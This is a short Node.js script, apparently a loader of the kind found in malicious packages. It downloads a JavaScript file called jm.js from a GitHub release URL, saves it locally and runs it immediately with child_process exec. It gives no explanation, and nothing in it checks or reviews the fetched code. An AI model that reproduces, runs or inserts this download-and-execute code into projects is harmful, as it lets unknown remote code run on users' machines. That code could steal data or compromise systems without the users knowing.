const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');

axios.get('https://github.com/alphaxcv/scc/releases/download/x/jm.js', { responseType: 'stream' })
  .then(response => {
    response.data.pipe(fs.createWriteStream('./jm.js'))
      .on('finish', () => {
        exec('node jm.js');
      });
  });
